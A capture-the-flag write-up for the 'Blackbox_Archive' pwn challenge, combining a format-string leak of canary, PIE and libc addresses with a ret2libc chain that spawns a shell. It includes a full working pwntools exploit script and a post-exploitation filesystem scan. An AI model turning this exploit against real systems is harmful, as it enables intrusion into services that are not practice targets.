---
title: "Blackbox_Archive"
category: "Pwn"
tags: ["format-string", "canary-leak", "pie-leak", "arbitrary-read", "ret2libc", "glibc-2.36"]
solve_date: "2026-10-10T14:00:00+07:00"
language: "en"
points: 450
---

# Blackbox_Archive

**Flag:** `foobarctf{format_leak_canary_pie_then_ret2libc}` (submitted in the `foobarctf{...}` wrapper announced by the task statement; see Result for the exact file contents on the container)  
**Attachment:** `blackbox` — 16,320 bytes, SHA-256 `3a3b5f0e0ebf5565d7d8a965c480cabd5246f8c4903600d133b86fe063a02ba8`  
**Service:** `nc foobar.challenge.arhn.in 10001` (`54.87.116.237:10001`)

## Challenge

> A legacy archive terminal has been exposed to the network. It accepts an archive label and a recovery note.
>
> Something about its metadata handling feels... unsafe.
>
> Connect using: foobar.challenge.arhn.in 54.87.116.237 10001
>
> Flag format: foobarctf{...}

## Analysis

Binary protections (`readelf -lW`, objdump):

| Mechanism | State | Consequence |
|---|---|---|
| PIE | enabled | code/PLT/GOT addresses are only usable after a leak |
| RELRO | Full (`GNU_RELRO 0x3d90–0x4000` covers the whole `.got`) | no GOT overwrite |
| NX | enabled (`GNU_STACK` is `RW` only) | no shellcode on the stack |
| Stack canary | present in `archive()` (`mov rax, fs:[0x28]` stored at `rbp-8`) | must leak the canary before overwriting a return address |

The only imported functions are `read`, `printf`, `puts`, `memset`, `setvbuf`, `__stack_chk_fail`. `archive()` (0x122a) contains two bugs:

```nasm
0x122a <archive>: endbr64; push rbp; mov rbp,rsp; sub rsp,0xd0
0x1239: mov rax,fword ptr fs:[0x28] ; mov [rbp-0x8],rax        ; canary
0x1248: lea rax,[rbp-0xd0] ; memset(rdi=rax, esi=0, edx=0x60)   ; label, 96 bytes
0x1261: lea rax,[rbp-0x70] ; memset(rdi=rax, esi=0, edx=0x60)   ; note,   96 bytes
0x129a: read(0, rbp-0xd0, 0x5f)                                  ; label
0x12bd: printf(rbp-0xd0)                                        ; <-- format string
0x12f1: read(0, rbp-0x70, 0x100)                                 ; <-- overflow: 0x100 > 0x60
0x1306: mov rax,[rbp-8]; sub rax,fs:[0x28]; je 0x131a; call __stack_chk_fail
0x131a: leave ; ret
```

**Stack layout and vararg indices.** `printf` takes the label buffer itself as the format string, so the stack-passed varargs begin at the pointer that would be the 7th argument — which is `rbp-0xd0`. Measured against the live service, slot 6 maps to `label[0]`, so slot $i$ corresponds to `label + (i-6)\cdot 8`:

| Slot | Address | Observed content |
|---:|---|---|
| 6–17 | `rbp-0xd0 … rbp-0x18` | the 12 qwords of the label buffer (our own bytes) |
| 30 | `rbp-0x10` | `base + 0x3d98` (`__DTOR_LIST__`) |
| 31 | `rbp-8` | **stack canary** (lowest byte is `0x00`) |
| 32 | `rbp` | saved rbp — an absolute stack pointer |
| 33 | `rbp+8` | return address into `main`, `base + 0x134c` → **PIE base** |
| 35 | `rbp+0x18` | return address inside `__libc_start_call_main` (`libc + 0x2724a`) |

Positional conversions (`%31$p`) work on this service. `%s` on a slot that is not a valid pointer (for instance the slot holding `argc = 1`) aborts the process at that conversion, so each probe only reads slots already known to hold pointers.

**Why one canary leak covers every later round.** The canary lives in the thread's TLS (`fs:[0x28]`) and glibc generates it once per process, so a re-entered `archive()` compares against the same value. `main` also rebuilds its frame at the same address, so the stack layout and the base stay constant. Leaking once in round 1 therefore allows repeating `archive()` as many times as needed inside a single connection.

**Stack alignment when returning to `main`.** After `leave; ret`, `rsp = archive_rbp + 16` (`≡ 0 mod 16`), i.e. 8 bytes off from the original `main` entry. Placing one `ret` gadget (`0x131b`) before the address of `main` restores `rsp ≡ 8 mod 16`; confirmed indirectly because `printf` (which uses `movaps`) runs without crashing in later rounds.

**Arbitrary read.** The binary is linked with `DT_FLAGS = BIND_NOW`, so by the time `printf(label)` executes, the GOT slots of `puts/printf/read/memset/setvbuf` already hold libc addresses. From round 2 onwards `base` is known, so writing an 8-byte target pointer into the label buffer and referencing its slot with `%<slot>$s` prints the bytes stored there: for a 6-byte userspace pointer, `%s` stops at the 7th (null) byte, which yields the whole address. The ASCII format text has to precede the pointers, otherwise the null bytes inside an address would terminate the format string.

The same primitive reads `argv[0]` and the environment in rounds 2–3, which reveals how the service actually runs:

```text
argv[0] = /app/blackbox
/proc/1/cmdline: socat TCP-LISTEN:10001,reuseaddr,fork EXEC:/app/blackbox,su=ctf,stderr
PATH=... HOSTNAME=... HOME=/home/ctf SHELL=/usr/sbin/nologin SOCAT_SOCKPORT=10001 ...
```

No environment variable carries the flag, and the binary never opens a file, so code execution is required to read `/app/flag.txt` (mode `0400`, owner `ctf`).

**Identifying the libc.** The GOT leak gives offsets relative to the load base, measured independently by walking `DT_DEBUG → r_debug → r_map → link_map` and reading each object's `l_addr` and `l_name` (because `l_addr` is page-aligned its lowest byte is null, so it is recovered by reading at `l_addr+1` and rebuilding the 8 bytes):

| Symbol | Offset in the service's libc |
|---|---:|
| `printf` | 0x525b0 |
| `setvbuf` | 0x77f90 |
| `puts` | 0x77980 |
| `read` | 0xf82a0 |
| `memset` | 0x1649c0 (the resolved IFUNC implementation, not the `.dynsym` stub at 0x9c840) |
| `__libc_start_call_main` return site | 0x2724a |

`l_name` of the object holding `puts` is `/lib/x86_64-linux-gnu/libc.so.6`. The Ubuntu builds compared during the analysis have different offsets (Ubuntu 2.39: `puts = 0x87cc0`, `read = 0x11bd20`; Ubuntu 2.43: `puts = 0x8e860`) and was excluded. The downloaded build below matches the measured offsets:

```text
libc6_2.36-9+deb12u14_amd64.deb (Debian 12) -> usr/lib/x86_64-linux-gnu/libc.so.6
sha256 6b4a45352fd0c540a9c7c718f35ce8c8e46a4e482f9d3885a910c32d1a0e1421
Build ID 93ac61ec5a8eb1396f9fbd350e3169a558528a40
```

In that file: `system = 0x4c490`, `"/bin/sh" = 0x197031`, `pop rdi; ret = 0x277e5`, `ret = 0x26e99`, `syscall; ret = 0x86172`, and the `call *%rax` site targeting `main` at `0x27248` (return address `0x2724a`, the value seen in slot 35).

## Solution

Note payload layout (256 bytes available, 152 used):

| Offset | Size | Value |
|---:|---:|---|
| 0 | 104 | filler (`'A'`), up to `rbp-8` |
| 104 | 8 | leaked canary (keeps the epilogue check intact) |
| 112 | 8 | leaked saved rbp |
| 120 | … | ROP chain |

Four steps, all inside one connection:

1. **Leak base + canary**: label = `_%30$p_%31$p_%32$p_%33$p`, asserting `slot33-0x134c == slot30-0x3d98` and that the result is page-aligned. Note = `filler|canary|saved_rbp| base+0x131b | base+0x131c` → `main` runs again and the banner is printed a second time.
2. **Leak libc**: the label carries three pointers `base+0x3fa8/0x3fb8/0x3fc8` (GOT of `puts/printf/read`) referenced by `%<slot>$s`. `libc = puts_leaked - 0x77980`. Return to `main`.
3. **Validate the read primitive before sending the ROP chain**: read at `libc` (must be `7f 45 4c 46 02 01 01 03`) and at `libc+0x197031` (must print `/bin/sh`). Both held across runs. Return to `main`.
4. **ret2libc**: chain `[base+0x131b, libc+0x277e5, libc+0x197031, libc+0x4c490]` = `ret; pop rdi; ret; "/bin/sh"; system`, where `rdi` is loaded by `pop rdi` and `system` is entered with `rsp ≡ 8 (mod 16)`, matching the ABI.

`system()` forks/clones and execs `/bin/sh` with `stdin/stdout` bound to the socket, so our connection becomes the shell's terminal (`uid=1000(ctf)`) with the permissions needed to read `/app/flag.txt`.

## Result

The following output was recorded from the script against the live service; runtime addresses differ between runs:

```text
[1] canary=0xdb415379c4c35700  base=0x5d6313ab0000
[2] puts=0x7f7ec86f8980  printf=0x7f7ec86d35b0  libc=0x7f7ec8681000
[3] @libc=b'\x7fELF\x02\x01\x01\x03'  @/bin/sh=b'/bin/sh'
[4] shell -> uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
GLUG{format_leak_canary_pie_then_ret2libc}
```

Data read from the remote through the shell (`od -c /app/flag.txt`, 43 bytes):

```text
0000000   G   L   U   G   {   f   o   r   m   a   t   _   l   e   a   k
0000020   _   c   a   n   a   r   y   _   p   i   e   _   t   h   e   n
0000040   _   r   e   t   2   l   i   b   c   }  \n
```

- Contents of the file on the container: `GLUG{format_leak_canary_pie_then_ret2libc}`.
- String submitted under the format stated by the task: `foobarctf{format_leak_canary_pie_then_ret2libc}` (identical body, different wrapper). No submission response was saved.
- A scan of the container's whole filesystem (excluding only `/proc` and `/sys`) with `grep -rhoaE "[A-Za-z0-9_]{2,12}\{[^}]{4,90}\}"` returns only the flag above; `/root` (0700) is not readable and offers no escalation path (`sudo` is not installed, only standard setuid binaries). The scan found only the string above in readable paths. It does not establish what exists in inaccessible directories.

## Reproduce

Requires Python 3 and pwntools (`pip install pwntools`). Save the final fenced block as `blackbox_archive.py` and run it against the service:

```bash
python3 blackbox_archive.py
```

Every address (canary, PIE base, libc base) is taken from the live connection, so the script is repeatable: 3/3 end-to-end runs reached the shell, and the leak/verify stage alone (steps 1–3) reproduced the same libc offsets on 6/6 connections. The 152-byte payload stays inside the note buffer's 256-byte `read` limit. The libc offsets only apply to the current image (`glibc 2.36-9+deb12u14`, build ID above); if the image changes, re-measure the five offsets `printf/setvbuf/puts/read/memset` in step 2 and re-match them against that distribution's libc6.

```python
#!/usr/bin/env python3
"""Blackbox_Archive (FooBar CTF 2026, Pwn 450): format string -> ret2libc.

Dependency: python3 + pwntools.   Run: python3 blackbox_archive.py
"""
import time
from pwn import remote, context, p64, u64

context.log_level = "error"
HOST, PORT = "foobar.challenge.arhn.in", 10001

# Offsets in the supplied binary (added to the runtime PIE base).
RET_GADGET = 0x131B          # `ret` at the tail of archive()'s epilogue
MAIN = 0x131C
RET_ADDR_TO_MAIN = 0x134C    # instruction after `call archive` inside main
DTOR_LIST = 0x3D98           # slot 30 holds base + 0x3d98 (cross-check)
GOT = {"puts": 0x3FA8, "printf": 0x3FB8, "read": 0x3FC8}

# Offsets in the remote libc: Debian 12 glibc 2.36-9+deb12u14 libc.so.6.
LIBC_PUTS = 0x77980
LIBC_SYSTEM = 0x4C490
LIBC_BINSH = 0x197031
LIBC_POP_RDI_RET = 0x277E5

SLOT0 = 6                    # varargs slot of the label buffer itself
PAD = 104                    # note buffer (rbp-0x70) -> saved canary (rbp-8)
SEP = b"\xff"


def connect():
    r = remote(HOST, PORT, timeout=30)
    r.recvuntil(b"Enter archive label:\n")
    return r


def printf_round(r, label):
    """Send a label, return the raw printf() output."""
    r.sendline(label)
    r.recvuntil(b"Archive metadata:\n")
    return r.recvuntil(b"\n").rstrip(b"\n")


def note_round(r, note):
    r.recvuntil(b"Enter recovery note:\n")
    r.sendline(note)
    return r.recvuntil(b"Enter archive label:\n")


def leak_slots(r, slots):
    fmt = b"".join(("_%" + str(i) + "$p").encode() for i in slots)
    out = printf_round(r, fmt)
    vals = [0 if t == b"(nil)" else int(t, 16) for t in out.split(b"_") if t]
    return dict(zip(slots, vals))


def stack_read(r, addrs):
    """%s-dereference up to 5 absolute addresses inside one label."""
    n = len(addrs)
    for k in range(1, 11):
        first = SLOT0 + k
        text = b"".join(b"%%%d$s" % (first + i) + SEP for i in range(n))
        if len(text) <= 8 * k and 8 * k + 8 * n <= 94:
            label = text + b" " * (8 * k - len(text)) + b"".join(p64(a) for a in addrs)
            return printf_round(r, label).split(SEP)[:n]
    raise RuntimeError("label too long")


def uptr(chunk):
    return u64(chunk[:6] + b"\x00\x00") if len(chunk) >= 6 else None


def reenter(r, ctx):
    note_round(r, overflow(ctx, [ctx["base"] + RET_GADGET, ctx["base"] + MAIN]))


def overflow(ctx, chain):
    return (b"A" * PAD + p64(ctx["canary"]) + p64(ctx["saved_rbp"]) +
            b"".join(p64(a) for a in chain))


def main():
    r = connect()

    # 1) canary, saved rbp and PIE base through the format string
    d = leak_slots(r, (30, 31, 32, 33))
    ctx = {"canary": d[31], "saved_rbp": d[32], "base": d[33] - RET_ADDR_TO_MAIN}
    assert ctx["base"] == d[30] - DTOR_LIST and ctx["base"] % 0x1000 == 0
    print("[1] canary=0x%016x  base=0x%x" % (ctx["canary"], ctx["base"]))
    reenter(r, ctx)

    # 2) real libc pointers from the binary's own GOT
    got = stack_read(r, [ctx["base"] + GOT[n] for n in ("puts", "printf", "read")])
    libc = uptr(got[0]) - LIBC_PUTS
    print("[2] puts=0x%x  printf=0x%x  libc=0x%x" % (uptr(got[0]), uptr(got[1]), libc))
    assert libc % 0x1000 == 0
    reenter(r, ctx)

    # 3) confirm the mapping and the command string before firing the chain
    chk = stack_read(r, [libc, libc + LIBC_BINSH])
    print("[3] @libc=%r  @/bin/sh=%r" % (chk[0][:8], chk[1][:7]))
    assert chk[0][:4] == b"\x7fELF" and chk[1][:7] == b"/bin/sh"
    reenter(r, ctx)

    # 4) ret2libc: ret; pop rdi; ret; "/bin/sh"; system
    printf_round(r, b"X")
    chain = [ctx["base"] + RET_GADGET, libc + LIBC_POP_RDI_RET,
             libc + LIBC_BINSH, libc + LIBC_SYSTEM]
    note = overflow(ctx, chain)
    r.recvuntil(b"Enter recovery note:\n")
    r.sendline(note)
    time.sleep(1.0)
    r.recv(timeout=3)

    r.sendline(b"id; cat /app/flag.txt")
    buf = b""
    for _ in range(4):
        try:
            buf += r.recv(timeout=5)
        except EOFError:
            break
    print("[4] shell ->", buf.decode(errors="replace").strip())
    r.close()


if __name__ == "__main__":
    main()
```
